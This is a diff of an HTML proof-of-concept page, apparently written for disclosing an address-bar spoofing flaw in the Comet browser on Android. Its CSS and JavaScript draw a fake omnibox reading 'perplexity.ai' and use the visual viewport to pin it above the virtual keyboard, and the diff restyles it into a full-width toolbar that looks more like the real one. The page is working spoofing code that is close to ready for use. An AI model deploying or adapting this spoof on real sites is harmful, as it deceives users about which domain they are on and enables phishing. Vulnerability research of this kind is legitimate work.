@@ -1,52 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 
 <head>
+
     <meta charset="UTF-8">
 
-    <meta name="viewport" content="width=device-width,
-             initial-scale=1.0,
-             maximum-scale=1.0,
-             user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <title>Comet Omnibox PoC</title>
+    <title>Comet Browser Android Spoof Bar PoC</title>
 
     <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        html,
         body {
             margin: 0;
-            padding: 0;
-            width: 100%;
-            min-height: 100%;
-        }
-
-        body {
-            font-family:
-                Roboto,
-                -apple-system,
-                BlinkMacSystemFont,
-                "Segoe UI",
-                sans-serif;
-
-            background: #f5f5f5;
-            color: #111;
-
-            min-height: 200vh;
             padding: 20px;
-        }
-
-        h2 {
-            margin-top: 10px;
+            font-family: Roboto, "Droid Sans", sans-serif;
+            background-color: #f5f5f5;
+            color: black;
+            height: 200vh;
         }
 
         button,
         textarea {
-            width: 100%;
             font-size: 16px;
+            width: 100%;
+            box-sizing: border-box;
             border-radius: 8px;
             border: 1px solid #ccc;
         }
@@ -54,12 +31,9 @@
         button {
             padding: 12px;
             margin-bottom: 20px;
-
             cursor: pointer;
-
             background: #007bff;
             color: white;
-
             border: none;
             font-weight: bold;
         }
@@ -68,7 +42,6 @@
             padding: 10px;
             height: 100px;
             margin-bottom: 20px;
-            resize: none;
         }
 
 
@@ -76,103 +49,116 @@
        COMET-LIKE OMNIBOX
        ===================================================== */
 
-        .fake-omnibox-wrapper {
+        .fake-bar-wrapper {
+
             position: fixed;
 
-            left: 0;
             width: 100%;
+            left: 0;
 
-            bottom: 0;
+            z-index: 9999;
 
-            z-index: 99999;
+            background-color: #1c1c1b;
 
-            padding: 0 32px;
+            /*
+       * Full width seperti browser toolbar.
+       * Tidak dibuat seperti pill.
+       */
+            padding: 7px 32px;
+
+            box-sizing: border-box;
 
             opacity: 0;
             visibility: hidden;
 
-            pointer-events: none;
-
             transition:
-                opacity 0.15s ease,
-                bottom 0.08s linear;
-        }
+                opacity 0.2s ease,
+                bottom 0.1s ease;
 
-
-        .fake-omnibox-wrapper.show {
-            opacity: 1;
-            visibility: visible;
-            pointer-events: auto;
-        }
-
-
-        /*
-     * Main Comet-style pill
-     */
-        .comet-omnibox {
-
-            width: 100%;
-            height: 122px;
-
-            background: #1c1c1b;
-
-            border-radius: 62px;
+            pointer-events: none;
 
             display: flex;
             align-items: center;
 
-            padding: 0 28px;
-
-            position: relative;
+            border-radius: 0;
 
             box-shadow:
-                0 0 0 1px rgba(255, 255, 255, 0.08),
-                0 8px 30px rgba(0, 0, 0, 0.45);
+                0 -2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+
+        .fake-bar-wrapper.show {
+
+            opacity: 1;
+            visibility: visible;
+
+            pointer-events: auto;
 
         }
 
 
         /* =====================================================
-       LEFT THREE-DOT MENU
+       MAIN OMNIBOX
+       ===================================================== */
+
+        .comet-omnibox {
+
+            width: 100%;
+            height: 58px;
+
+            background-color: #1c1c1b;
+
+            display: flex;
+            align-items: center;
+
+            padding: 0;
+
+            box-sizing: border-box;
+        }
+
+
+        /* =====================================================
+       THREE DOT MENU
        ===================================================== */
 
         .menu-button {
 
-            width: 42px;
-            height: 64px;
+            width: 34px;
+            height: 58px;
 
             display: flex;
+
             flex-direction: column;
 
             justify-content: center;
             align-items: center;
 
-            gap: 7px;
+            gap: 5px;
 
             flex-shrink: 0;
 
-            margin-right: 20px;
+            margin-right: 12px;
         }
 
 
         .menu-dot {
 
-            width: 9px;
-            height: 9px;
+            width: 6px;
+            height: 6px;
 
-            background: #eeeeee;
+            background-color: #eeeeee;
 
             border-radius: 50%;
 
-            opacity: 0.9;
+            opacity: 0.95;
         }
 
 
         /* =====================================================
-       DOMAIN
+       URL
        ===================================================== */
 
-        .omnibox-url {
+        .url-text {
 
             flex: 1;
 
@@ -180,7 +166,7 @@
 
             color: #eeeeee;
 
-            font-size: 31px;
+            font-size: 17px;
 
             font-weight: 400;
 
@@ -192,20 +178,18 @@
 
             text-overflow: ellipsis;
 
-            letter-spacing: -0.4px;
-
-            user-select: none;
+            letter-spacing: 0;
         }
 
 
         /* =====================================================
-       REFRESH ICON
+       REFRESH BUTTON
        ===================================================== */
 
         .refresh-button {
 
-            width: 52px;
-            height: 64px;
+            width: 40px;
+            height: 58px;
 
             display: flex;
 
@@ -214,14 +198,14 @@
 
             flex-shrink: 0;
 
-            margin-left: 20px;
+            margin-left: 12px;
         }
 
 
         .refresh-icon {
 
-            width: 44px;
-            height: 44px;
+            width: 27px;
+            height: 27px;
 
             color: #eeeeee;
 
@@ -230,12 +214,13 @@
 
 
         /* =====================================================
-       PAGE CONTENT
+       PAGE
        ===================================================== */
 
         .spacer {
             height: 100vh;
         }
+
 
         .bottom-anchor {
 
@@ -247,83 +232,25 @@
 
             background: #ddd;
         }
-
-
-        /* =====================================================
-       MOBILE ADJUSTMENT
-       ===================================================== */
-
-        @media (max-width: 600px) {
-
-            .fake-omnibox-wrapper {
-                padding: 0 32px;
-            }
-
-            .comet-omnibox {
-                height: 122px;
-                border-radius: 61px;
-                padding: 0 25px;
-            }
-
-            .omnibox-url {
-                font-size: 27px;
-            }
-
-            .menu-button {
-                margin-right: 12px;
-            }
-
-            .refresh-button {
-                margin-left: 12px;
-            }
-
-            .refresh-icon {
-                width: 40px;
-                height: 40px;
-            }
-        }
-
-
-        /* Smaller mobile screens */
-
-        @media (max-width: 390px) {
-
-            .fake-omnibox-wrapper {
-                padding: 0 18px;
-            }
-
-            .comet-omnibox {
-                padding: 0 18px;
-            }
-
-            .omnibox-url {
-                font-size: 21px;
-            }
-
-            .menu-button {
-                margin-right: 8px;
-            }
-
-            .refresh-button {
-                margin-left: 8px;
-            }
-        }
     </style>
+
 </head>
 
 
 <body>
 
-    <h2>Comet Omnibox PoC</h2>
+
+    <h2>Vulnerability PoC - Comet Browser Android Spoof Bar by k4tedu</h2>
+
 
     <p>
-        Tap the button or textarea to display the
-        Comet-like omnibox above the virtual keyboard.
+        Click the “Go to perplexity.ai” button or the textarea
+        on the page to bring up the virtual keyboard
     </p>
 
 
     <button id="showBtn">
-        Go to perplxity.ai
+        Go to perplexity.ai
     </button>
 
 
@@ -334,12 +261,12 @@
        FAKE COMET OMNIBOX
        ===================================================== -->
 
-    <div class="fake-omnibox-wrapper" id="fakeOmnibox">
+    <div class="fake-bar-wrapper" id="fakeBar">
 
         <div class="comet-omnibox">
 
 
-            <!-- LEFT MENU -->
+            <!-- THREE DOTS -->
 
             <div class="menu-button">
 
@@ -350,23 +277,23 @@
             </div>
 
 
-            <!-- DOMAIN -->
+            <!-- URL -->
 
-            <div class="omnibox-url">
+            <span class="url-text">
                 perplexity.ai
-            </div>
+            </span>
 
 
             <!-- REFRESH -->
 
             <div class="refresh-button">
 
-                <svg class="refresh-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                <svg class="refresh-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
                     stroke-linecap="round" stroke-linejoin="round">
 
-                    <path d="M21 12a9 9 0 1 1-2.64-6.36" />
+                    <path d="M21 12a9 9 0 1 1-2.64-6.36"></path>
 
-                    <path d="M21 3v6h-6" />
+                    <path d="M21 3v6h-6"></path>
 
                 </svg>
 
@@ -381,114 +308,98 @@
 
 
     <div class="bottom-anchor">
-        Bottom of page
+        Bagian Bawah Halaman
     </div>
 
 
     <script>
 
-        const fakeOmnibox =
-            document.getElementById("fakeOmnibox");
+        const fakeBar =
+            document.getElementById('fakeBar');
 
-        const textarea =
-            document.getElementById("ta");
+        const ta =
+            document.getElementById('ta');
 
 
-        /*
-         * Position the fake omnibox directly
-         * above the Android virtual keyboard.
-         */
-
-        function adjustOmnibox() {
+        function adjustFakeBar() {
 
             const vv = window.visualViewport;
 
-            if (!vv) {
-                return;
+            if (vv) {
+
+                const keyboardHeight =
+                    window.innerHeight -
+                    vv.height -
+                    vv.offsetTop;
+
+                fakeBar.style.bottom =
+                    (keyboardHeight > 0
+                        ? keyboardHeight
+                        : 0
+                    ) + 'px';
+
             }
 
-
-            const keyboardHeight =
-                window.innerHeight
-                - vv.height
-                - vv.offsetTop;
-
-
-            fakeOmnibox.style.bottom =
-                (keyboardHeight > 0
-                    ? keyboardHeight
-                    : 0
-                ) + "px";
         }
 
 
-        function showOmnibox() {
+        function showFakeBar() {
 
-            fakeOmnibox.classList.add("show");
+            fakeBar.classList.add('show');
 
-            adjustOmnibox();
+            if (window.visualViewport) {
+                adjustFakeBar();
+            }
+
         }
 
 
-        function hideOmnibox() {
+        function hideFakeBar() {
 
-            fakeOmnibox.classList.remove("show");
+            fakeBar.classList.remove('show');
 
-            fakeOmnibox.style.bottom = "0px";
         }
 
 
-        /*
-         * Monitor Android visual viewport changes.
-         */
-
-        if ("visualViewport" in window) {
+        if ('visualViewport' in window) {
 
             window.visualViewport.addEventListener(
-                "resize",
-                adjustOmnibox
+                'resize',
+                adjustFakeBar
             );
 
             window.visualViewport.addEventListener(
-                "scroll",
-                adjustOmnibox
+                'scroll',
+                adjustFakeBar
             );
 
         }
 
-
-        /*
-         * Button -> focus textarea -> keyboard
-         */
 
         document
             .getElementById("showBtn")
-            .addEventListener("click", () => {
+            .onclick = () => {
 
-                textarea.focus();
+                ta.focus();
 
-                showOmnibox();
+                showFakeBar();
 
-            });
+            };
 
 
-        /*
-         * Direct textarea interaction
-         */
-
-        textarea.addEventListener(
-            "focus",
-            showOmnibox
+        ta.addEventListener(
+            'focus',
+            showFakeBar
         );
 
 
-        textarea.addEventListener(
-            "blur",
-            hideOmnibox
+        ta.addEventListener(
+            'blur',
+            hideFakeBar
         );
-
 
     </script>
+
 
 </body>
 
